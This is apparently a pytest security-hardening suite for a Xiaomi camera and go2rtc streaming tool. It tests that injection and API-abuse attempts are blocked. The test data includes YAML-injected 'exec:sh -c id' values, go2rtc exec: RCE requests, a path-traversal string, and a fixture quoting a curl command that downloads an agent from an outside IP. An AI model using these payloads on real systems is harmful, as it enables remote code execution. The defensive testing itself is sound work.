import json
import os
import sys
import tempfile
import urllib.error
import urllib.request
import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from xiaomi_wizard import (
    XiaomiWizardSession,
    ensure_hardened_go2rtc_yaml,
    generate_env_content,
    generate_go2rtc_yaml,
    sanitize_camera_data,
)
from youtube_streamer import validate_stream_key
from recorder import recorder, DEFAULT_STORAGE_DIR


def test_yaml_and_env_injection_blocked():
    base_cam = {
        "ip": "192.168.1.55",
        "port": 54321,
        "token": "abcdef0123456789abcdef0123456789",
        "did": "987654321",
        "name": "CCTV Aman",
        "model": "chuangmi.camera.075ae1",
        "lens_type": "dual",
        "region": "sg",
        "user_id": "12345678",
        "pass_token": "V1:validToken123==",
    }

    malicious_payloads = [
        {"ip": "192.168.1.11\n  pwn:\n    - exec:sh -c id"},
        {"ip": "192.168.1.11?extra=1#exec:id"},
        {"did": "12345\n  pwn:\n    - exec:id"},
        {"model": "chuangmi.camera.075ae1\n  pwn: exec:id"},
        {"region": "sg\n  pwn: exec:id"},
        {"token": "not_a_valid_32_char_hex_token_xx"},
        {"user_id": "12345\"\n  pwn: exec:id"},
        {"pass_token": "V1:abc\nstreams:\n  pwn:\n    - exec:id"},
        {"port": 99999},
    ]

    for bad in malicious_payloads:
        payload = {**base_cam, **bad}
        with pytest.raises(ValueError):
            sanitize_camera_data(payload)
        with pytest.raises(ValueError):
            generate_go2rtc_yaml(payload)
        with pytest.raises(ValueError):
            generate_env_content(payload)

    with tempfile.TemporaryDirectory() as tmpdir:
        session = XiaomiWizardSession()
        ok = session.apply_camera_config({**base_cam, "ip": "192.168.1.1\n  pwn: exec:id"}, base_dir=tmpdir)
        assert ok is False
        assert not os.path.exists(os.path.join(tmpdir, "go2rtc.yaml"))


def test_go2rtc_yaml_includes_app_modules_and_exec_echo_lockdown():
    yaml_text = generate_go2rtc_yaml({
        "ip": "192.168.1.55",
        "did": "987654321",
        "model": "chuangmi.camera.075ae1",
        "lens_type": "dual",
        "region": "sg",
        "user_id": "12345678",
        "pass_token": "V1:mockpasstokendata==",
    })
    assert "app:\n  modules:" in yaml_text
    assert "- xiaomi" in yaml_text
    assert "- exec" not in yaml_text
    assert "- echo" not in yaml_text
    assert "- expr" not in yaml_text
    assert "allow_paths:" in yaml_text
    assert "- /api/ws" in yaml_text
    assert "/api/config" not in yaml_text
    assert "/api/streams" not in yaml_text
    assert "/api/exit" not in yaml_text
    assert "exec:\n  allow_paths:\n    - /nonexistent/disabled" in yaml_text
    assert "echo:\n  allow_paths:\n    - /nonexistent/disabled" in yaml_text
    assert 'listen: "127.0.0.1:8554"' in yaml_text


def test_ensure_hardened_go2rtc_yaml_bootstraps_and_strips_exec_echo_expr():
    with tempfile.TemporaryDirectory() as tmpdir:
        yaml_path = os.path.join(tmpdir, "go2rtc.yaml")
        # 1. Bootstrap when go2rtc.yaml is missing (first-run protection)
        changed = ensure_hardened_go2rtc_yaml(tmpdir)
        assert changed is True
        assert os.path.exists(yaml_path)
        with open(yaml_path, "r", encoding="utf-8") as f:
            boot_text = f.read()
        assert "app:\n  modules:" in boot_text
        assert "allow_paths:" in boot_text

        # 2. Sanitize an older or compromised go2rtc.yaml containing Contabo-style exec:/echo:/expr: streams
        tampered = """api:
  listen: ":1984"
  origin: "*"

streams:
  cctv_lensa_kiri:
    - xiaomi://123:sg@192.168.1.11?did=555&model=chuangmi.camera.075ae1&shared=1&subtype=3
  pweexhnk:
    - exec:sh -c "curl -fsL http://130.94.37.220:8877/a/agent -o .td-c"
    - echo:sh -c "id"
    - expr:1+1
"""
        with open(yaml_path, "w", encoding="utf-8") as f:
            f.write(tampered)

        changed2 = ensure_hardened_go2rtc_yaml(tmpdir)
        assert changed2 is True
        with open(yaml_path, "r", encoding="utf-8") as f:
            sanitized = f.read()
        assert "exec:sh" not in sanitized
        assert "echo:sh" not in sanitized
        assert "expr:" not in sanitized
        assert "app:\n  modules:" in sanitized
        assert "xiaomi://123:sg@192.168.1.11" in sanitized


def test_live_go2rtc_blocks_config_leak_and_dynamic_stream_injection():
    # 1. GET /api/config must be blocked (404 or 403)
    req_cfg = urllib.request.Request("http://127.0.0.1:1984/api/config", method="GET")
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(req_cfg, timeout=3)
    assert exc_info.value.code in (403, 404)

    # 2. PATCH /api/config (Contabo RCE vector) must be blocked (404 or 403)
    req_patch_cfg = urllib.request.Request(
        "http://127.0.0.1:1984/api/config",
        data=b"streams:\n  pweexhnk:\n    - exec:id\n",
        method="PATCH",
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(req_patch_cfg, timeout=3)
    assert exc_info.value.code in (403, 404)

    # 3. PUT /api/streams?name=pwn&src=exec:id must be blocked (404 or 403)
    req_put = urllib.request.Request(
        "http://127.0.0.1:1984/api/streams?name=pwn&src=exec:id",
        data=b"",
        method="PUT",
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(req_put, timeout=3)
    assert exc_info.value.code in (403, 404)

    # 4. DELETE /api/streams?src=cctv_lensa_kiri must be blocked (404 or 403)
    req_del = urllib.request.Request(
        "http://127.0.0.1:1984/api/streams?src=cctv_lensa_kiri",
        method="DELETE",
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(req_del, timeout=3)
    assert exc_info.value.code in (403, 404)

    # 5. Dynamic ad-hoc stream creation via GetOrPatch on /api/frame.jpeg must be rejected (404)
    req_adhoc = urllib.request.Request(
        "http://127.0.0.1:1984/api/frame.jpeg?name=cctv_lensa_kiri&src=exec:id",
        method="GET",
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(req_adhoc, timeout=3)
    assert exc_info.value.code == 404

    # 6. POST /api/restart from non-loopback LAN IP must be blocked (403 Forbidden)
    req_lan_restart = urllib.request.Request(
        "http://192.168.1.44:1984/api/restart",
        data=b"",
        method="POST",
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(req_lan_restart, timeout=3)
    assert exc_info.value.code == 403


def test_server_redacts_tokens_and_blocks_csrf_dotfiles_telegram_ssrf_and_unauth_wizard_save():
    # 1. /api/status must not expose MIIO 32-char hex token
    with urllib.request.urlopen("http://127.0.0.1:8088/api/status", timeout=5) as resp:
        status_data = json.loads(resp.read().decode("utf-8"))
        info = status_data.get("info") or {}
        assert "token" not in info
        assert resp.headers.get("X-Content-Type-Options") == "nosniff"
        assert resp.headers.get("X-Frame-Options") == "SAMEORIGIN"

    # 2. /api/wizard/devices must not expose MIIO 32-char hex token
    with urllib.request.urlopen("http://127.0.0.1:8088/api/wizard/devices", timeout=5) as resp:
        dev_data = json.loads(resp.read().decode("utf-8"))
        for cam in dev_data.get("cameras", []):
            assert "token" not in cam

    # 3. Dotfile paths (/.env, /.git) must return 403 Forbidden
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen("http://127.0.0.1:8088/.env", timeout=5)
    assert exc_info.value.code == 403

    # 4. Telegram test endpoint must reject malformed bot_token / chat_id (anti-SSRF/header injection)
    bad_tg = urllib.request.Request(
        "http://127.0.0.1:8088/api/telegram/test",
        data=json.dumps({"bot_token": "../../evil@127.0.0.1:8080/pwn#", "chat_id": "123\r\nInjected: 1"}).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(bad_tg, timeout=5)
    assert exc_info.value.code == 400

    # 5. Unauthenticated arbitrary DID overwrite on /api/wizard/save must return 403
    bad_save = urllib.request.Request(
        "http://127.0.0.1:8088/api/wizard/save",
        data=json.dumps({"did": "999999999", "ip": "192.168.1.11\n  pwn: exec:id"}).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(bad_save, timeout=5)
    assert exc_info.value.code in (400, 403)

    # 6. Cross-origin POST from external website must return 403 Forbidden
    csrf_req = urllib.request.Request(
        "http://127.0.0.1:8088/api/youtube/stop",
        data=b"{}",
        headers={
            "Content-Type": "application/json",
            "Origin": "https://evil-attacker.example.com",
        },
        method="POST",
    )
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(csrf_req, timeout=5)
    assert exc_info.value.code == 403


def test_youtube_stream_key_and_recorder_storage_dir_hardening():
    assert validate_stream_key("live_12345678_abcdefghijk") is True
    assert validate_stream_key("abcd-1234-efgh-5678") is True
    assert validate_stream_key("bad key with spaces") is False
    assert validate_stream_key("bad\nkey") is False
    assert validate_stream_key("../../etc/passwd") is False
    assert validate_stream_key("ab") is False

    # Recorder must ignore attempts to override storage_dir via API
    st = recorder.update_config({"storage_dir": "/tmp/arbitrary_dir_attempt"})
    assert st["config"]["storage_dir"] == DEFAULT_STORAGE_DIR
    assert recorder.config["storage_dir"] == DEFAULT_STORAGE_DIR
